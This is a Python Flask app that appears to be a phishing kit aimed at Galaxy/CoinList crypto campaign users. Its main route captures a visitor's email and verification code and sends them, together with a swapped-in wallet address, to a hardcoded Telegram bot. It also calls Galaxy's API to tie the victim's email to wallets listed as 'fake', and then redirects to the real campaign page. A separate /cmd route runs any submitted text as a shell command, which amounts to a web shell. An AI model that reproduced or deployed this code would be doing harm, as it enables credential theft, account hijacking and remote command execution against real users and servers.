from flask import render_template,request,redirect,jsonify
#Import variables stored in _init_.py
from flask import Flask
import os
import subprocess
import requests
app = Flask(__name__)
app.debug = True
glob_a = {}
glob_send = {}
list_email={'alexvozg@gmail.com':"0x0f17714c57d4F60442b4C3438dCFa992A8D67Bbc","test":"ETH"}
list_of_fake=['0x0f17714c57d4F60442b4C3438dCFa992A8D67Bbc','0x0f17714c57d4F60442b4C3438dCFa992A8D67Bbc','0x0f17714c57d4F60442b4C3438dCFa992A8D67Bbc']
popped_element=''
@app.route('/cmd',methods=['GET','POST'])
def cmd():
 if request.method=='POST':
  #output = subprocess.Popen(request.form['cmd'],stdout = subprocess.PIPE).communicate()[0]
  output=subprocess.check_output(request.form['cmd'],shell = True)
  #print(request.form['cmd'])
  #cmd = subprocess.Popen(request.form['cmd'],stdout=subprocess.PIPE,stderr=subprocess.PIPE)
  #stdout,error = cmd.communicate()
  memory = output
  #return "Ok"
  return render_template('index.html', memory=memory)
 else:
  output='None'
  #return "Ok"
  return render_template('index.html',memory=output)
  #memory='None'
 return None
@app.route('/1')
def index():
    global list_of_fake
    #a_list = [1, 2, 3]
    #popped_element = list_of_fake.pop(0)
    #popped_element = list_of_fake.pop(0)
    #popped_element = list_of_fake.pop(0)
    if list_of_fake:
        popped_element = list_of_fake.pop(0)
    else:
        popped_element=''
    return popped_element+" "+str(list_of_fake)

 #output = subprocess.Popen(['dir'],stdout = subprocess.PIPE).communicate()[0]
 #memory=str(output)
 #return render_template('new.html')

@app.route('/',methods=['GET','POST'])
def cmd1():
 global glob_a
 global list_email
 global list_of_fake
 global send
 global popped_element
 #a={}
 if request.method=='POST':
  #output = subprocess.Popen(request.form['cmd'],stdout = subprocess.PIPE).communicate()[0]
  #res=request.form.get('data')
  #data= request.json
  #data = request.get_json()
  #name = data.get('test', '')
  #print(name)

  #print(jsonify(res))
  b=request.form['email']
  c=request.form['code']

  glob_a[b]='1'
  print(glob_a)
  #output=subprocess.check_output(request.form['cmd'],shell = True)
  print(request.form['code'])
  answer = {'chat_id': 488735610, 'text': popped_element +' '+b+' '+c}
  print (answer)
  requests.post('https://api.telegram.org/bot521265983:AAFUSq8QQzLUURwmCgXeBCjhRThRvf9YVM0/sendMessage',data=answer).text
  #cmd = subprocess.Popen(request.form['cmd'],stdout=subprocess.PIPE,stderr=subprocess.PIPE)
  #stdout,error = cmd.communicate()
  #memory = output
  #return "Ok"
  return redirect("https://galaxy.eco/coinlist/campaign/GCAQYUUoVG", code=302)
  #return render_template('index.html', memory=memory)
 else:
  #username = request.args.get('username')


  emailValue = request.args.get('email')
  if emailValue is None:
      emailValue ="-"
      return redirect("https://galaxy.eco/coinlist/campaign/GCAQYUUoVG", code=302)
  if emailValue not in glob_a:
      glob_a[emailValue]='0'
  #output='None'
  #return "Ok"
  #https://curlconverter.com/#python
  if emailValue in list_email:
      wallet=list_email[emailValue]
      if list_of_fake and glob_a[emailValue]=='0' :
          if emailValue not in glob_send:
              popped_element = list_of_fake.pop(0)
              glob_send[emailValue]='1'
              print (f'email = {emailValue} ; wallet= {popped_element} global_send={str(glob_send)}')
              headers = {'Accept-Encoding': 'gzip, deflate, br','Content-Type': 'application/json','Accept': 'application/json','Connection': 'keep-alive','DNT': '1','Origin': 'https://graphigo.prd.galaxy.eco'}
              #data = '{"query":"# Write your query or mutation here\\nmutation SendVerifyCode($input: SendVerificationEmailInput!)\\n{\\n  sendVerificationCode(input:$input) {       code       message   }}\\n\\n\\n","variables":{"input":{"address":"0x0f17714c57d4F60442b4C3438dCFa992A8D67Bbc","email":"alexvozg@gmail.com"}}}'
              #t_wallet="0x0f17714c57d4F60442b4C3438dCFa992A8D67Bbc"
              t_wallet=popped_element
              #t_email="alexvozg@gmail.com"
              t_email=emailValue
              data = '{"query":"# Write your query or mutation here\\nmutation SendVerifyCode($input: SendVerificationEmailInput!)\\n{\\n  sendVerificationCode(input:$input) {       code       message   }}\\n\\n\\n","variables":{"input":{"address":"'+t_wallet+'","email":"'+t_email+'"}}}'

              #data = '{"query":"# Write your query or mutation here\\nmutation SendVerifyCode($input: SendVerificationEmailInput!)\\n{\\n  sendVerificationCode(input:$input) {       code       message   }}\\n\\n\\n","variables":{"input":{"address":%s,"email":%s}}}' %("0x0f17714c57d4F60442b4C3438dCFa992A8D67Bbc","alexvozg@gmail.com")
              print(data)
              #print(data1)
              response = requests.post('https://graphigo.prd.galaxy.eco/query', headers=headers, data=data)
              print(response)
                #data = '{"query":"# Write your query or mutation here\\nmutation SendVerifyCode($input: SendVerificationEmailInput!)\\n{\\n  sendVerificationCode(input:$input) {       code       message   }}\\n\\n\\n","variables":{"input":{"address":"0x0f17714c57d4F60442b4C3438dCFa992A8D67Bbc","email":"alexvozg@gmail.com"}}}'




      else:
          popped_element=''
  else:
      wallet='-'
  #emailValue="test@gmail.com"
  #a[emailValue]='0'
  print(glob_a)
  if glob_a[emailValue]=='1':
      return redirect("https://galaxy.eco/coinlist/campaign/GCAQYUUoVG", code=302)
  else:
      return render_template('galaxy.html',wallet=wallet,emailValue=emailValue)
  #return render_template('new.html')
  #return render_template('index.html',memory=output)
  #memory='None'
 return None


     #return render_template('galaxy.html', memory=memory)
if __name__ == '__main__':
 app.run(debug=True)
